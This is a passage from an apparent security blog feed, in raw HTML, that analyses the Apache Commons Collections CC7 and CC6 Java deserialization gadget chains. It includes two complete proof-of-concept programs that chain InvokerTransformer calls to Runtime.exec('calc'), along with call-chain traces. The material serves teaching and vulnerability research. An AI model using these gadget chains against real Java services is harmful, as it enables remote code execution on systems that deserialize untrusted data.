class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">       <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">           length--;</span><br><span class="line">       <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">           length = origlength;</span><br><span class="line"><span class="comment">//根据length创建table数组</span></span><br><span class="line">       table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">       threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">       count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化，还原table数组</span></span><br><span class="line">       <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">           reconstitutionPut(table, key, value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Hashtable会先从反序列化流中读取table数组的容量和元素个数，根据origlength 和elements 计算出table数组的length，根据length来创建table数组，然后从反序列化流中依次读取每个元素，再调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。</p><p>我们分析一下reconstitutionPut方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException &#123;</span><br><span class="line"><span class="comment">//value不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重新计算key的hash值</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line"><span class="comment">//根据hash值计算存储索引</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="comment">//判断元素的key是否重复</span></span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line"><span class="comment">//如果key重复则抛出异常</span></span><br><span class="line">           <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//key不重复则将元素添加到table数组中</span></span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">           Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">       tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">       count++;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到table数组中。</p><p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p><p>跟进<code>e.key.equals()</code>，发现调用的是LazyMap的equals方法，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类AbstractMapDecorator的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"><span class="comment">//是否为同一对象（比较引用）</span></span><br><span class="line"><span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用HashMap的equals方法</span></span><br><span class="line"><span class="keyword">return</span> map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们通过LazyMap的decorate()方法将HashMap传给了map属性，因此这里会调用HashMap的equals方法。而HashMap中不存在equals方法，但HashMap继承了AbstractMap抽象类，该类中有一个equals方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">//是否为同一对象</span></span><br><span class="line">      <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//运行类型是否不是Map</span></span><br><span class="line">      <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//向上转型</span></span><br><span class="line">      Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line"><span class="comment">//判断HashMap的元素的个数size</span></span><br><span class="line">      <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取HashMap的迭代器</span></span><br><span class="line">          Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">          <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line"><span class="comment">//获取每个元素（Node）</span></span><br><span class="line">              Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="comment">//获取key和value</span></span><br><span class="line">              <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">              <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="comment">//如果value为null，则判断key</span></span><br><span class="line">              <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//如果value不为null，判断value内容是否相同</span></span><br><span class="line">                  <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中m对象本质上是一个LazyMap，LazyMap的get方法内部会判断当前传入的key是否已存在，如果不在则会进入if语句中调用transform方法，从而产生漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">     <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//构造命令执行环境</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">         map.put(key, value);</span><br><span class="line">         <span class="keyword">return</span> value;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> map.get(key);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">https://blog.csdn.net/qq_35733751/article/details/119862728</a></p><p><a href="https://www.freebuf.com/vuls/330087.html">https://www.freebuf.com/vuls/330087.html</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13910833.html">https://www.cnblogs.com/nice0e3/p/13910833.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;该链和CC6类似，不过CC7利用链中是使用&lt;code&gt;Hashtable&lt;/code&gt;作为反序列化的入口点。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections6分析</title>
    <link href="https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections6%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections6%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T16:31:07.000Z</published>
    <updated>2022-06-04T18:40:58.396Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC6链中和CC5的利用链类似，只是CC6链中使用的是<code>HashSet</code>去触发<code>LazyMap</code>的get方法，而在CC5中使用的是<code>BadAttributeValueExpException</code>。</p><span id="more"></span><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">Testtransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605003843229-754416907.png" alt="image-20220605003842219"></p><p>前面的代码和cc1、cc5链一致，看下不同的地方。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br><span class="line">lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"> <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br></pre></td></tr></table></figure><p>使用的是<code>HashSet</code>来进行构造，将前面的<code>TiedMapEntry</code>实例化对象添加进去，还调用了<code>lazyMap.remove</code>方法将<code>test1</code>给移除，这是为了能进入到判断语句里面去。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010414103-1179196187.png" alt="image-20220605010413225"></p><p>接下来进行调试分析，在<code>HashSet#readObject()</code>方法中打下断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010154554-133073869.png" alt="image-20220605010153640"></p><p>在<code>Hashset</code>的<code>readObject</code>方法中，回去调用<code>map</code>的<code>put</code>方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010849928-1051815863.png" alt="image-20220605010848871"></p><p>这里调用的是<code>Hashmap</code>的<code>put</code>方法，跟进一下该方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010940153-1645120977.png" alt="image-20220605010939375"></p><p>方法中会调用<code>hash()</code>方法，跟进到<code>hash()</code>方法中，发现会调用<code>key.hashCode()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011124493-1678946676.png" alt="image-20220605011123771"></p><p><code>hashcode</code>还会去调用<code>getValue()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011333692-1054386596.png" alt="image-20220605011332786"></p><p>进入<code>getValue()</code>方法，后续的分析就和cc5一致了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011452059-612193209.png" alt="image-20220605011451491"></p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject-&gt;HashMap.put</span><br><span class="line">-&gt;HashMap.hash-&gt;TiedMapEntry.hashCode</span><br><span class="line">-&gt;TiedMapEntry.getValue-&gt;LazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Runtime.exec</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>poc2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> 